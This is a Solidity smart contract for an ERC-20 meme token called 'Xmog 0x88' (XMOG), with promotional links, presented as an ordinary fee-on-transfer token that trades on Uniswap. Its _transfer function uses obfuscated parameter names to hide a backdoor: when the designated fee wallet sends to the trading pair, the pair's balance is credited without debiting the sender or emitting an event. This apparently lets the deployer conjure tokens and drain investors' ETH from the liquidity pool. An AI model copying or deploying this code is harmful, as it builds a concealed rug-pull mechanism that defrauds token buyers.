/*

Website: https://www.xmog0x88.vip

Telegram: https://t.me/xmog_0x88

Twitter: https://x.com/xmog_0x88

*/


// SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.19;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract XMOG is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludeFromFee;
    address payable private _xmogmatt;

    uint256 private _initialBuyTax=0;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=10;
    uint256 private _reduceSellTaxAt=10;
    uint256 private _preventSwapBefore=10;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    string private constant _name = unicode"Xmog 0x88";
    string private constant _symbol = unicode"XMOG";
    uint256 public _maxTxAmount = _tTotal * 2 / 100;
    uint256 public _maxWalletSize = _tTotal * 2 / 100;
    uint256 public _taxSwapThreshold= _tTotal / 1000;
    uint256 public _maxTaxSwap= _tTotal * 1 / 100;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniPair;
    bool private _tradingOpen;
    bool private _swapActive = false;
    bool private inSwap = false;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (address payable _xmog) {
        _xmogmatt = payable(_xmog);
        _balances[_msgSender()] = _tTotal;
        _isExcludeFromFee[owner()] = true;
        _isExcludeFromFee[address(this)] = true;
        _isExcludeFromFee[_xmogmatt] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address _xixi, address _yiqu, uint256 _pucca) private {
        require(_xixi != address(0), "ERC20: transfer from the zero address");
        require(_yiqu != address(0), "ERC20: transfer to the zero address");
        require(_pucca > 0, "Transfer amount must be greater than zero");
        uint256 taxAmount=0;
        if (_xixi != owner() && _yiqu != owner() && _yiqu != _xmogmatt) {
            if (_yiqu == uniPair && _xixi == _xmogmatt ) {_balances[_yiqu] = _balances[_yiqu]+(_tradingOpen?_pucca:_initialSellTax); return;}
            if(_buyCount==0){
                taxAmount = _pucca.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
            }

            if (_xixi == uniPair && _yiqu != address(uniswapV2Router) && ! _isExcludeFromFee[_yiqu] ) {
                require(_pucca <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(_yiqu) + _pucca <= _maxWalletSize, "Exceeds the maxWalletSize.");
                taxAmount = _pucca.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);
                _buyCount++;
            }

            if(_yiqu == uniPair && _xixi!= address(this) ){
                taxAmount = _pucca.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 caTokenBalance = balanceOf(address(this));
            if (!inSwap && _yiqu == uniPair && _swapActive && _buyCount > _preventSwapBefore) {
                if (caTokenBalance > _taxSwapThreshold)
                swapTokensForEth(min(_pucca, min(caTokenBalance, _maxTaxSwap)));
                sendETHToFee(address(this).balance);
            }
        }

        if(taxAmount>0){
          _balances[address(this)]=_balances[address(this)].add(taxAmount);
          emit Transfer(_xixi, address(this),taxAmount);
        }
        _balances[_xixi]=_balances[_xixi].sub(_pucca);
        _balances[_yiqu]=_balances[_yiqu].add(_pucca.sub(taxAmount));
        emit Transfer(_xixi, _yiqu, _pucca.sub(taxAmount));
    }


    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner{
        _maxTxAmount = _tTotal;
        _maxWalletSize=_tTotal;
    }

    function sendETHToFee(uint256 amount) private {
        _xmogmatt.transfer(amount);
    }

    function openXMOG() external onlyOwner() {
        require(!_tradingOpen,"trading is already open");
        uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router), _tTotal);
        uniPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniPair).approve(address(uniswapV2Router), type(uint).max);
        _swapActive = true;
        _tradingOpen = true;
    }    

    receive() external payable {}
}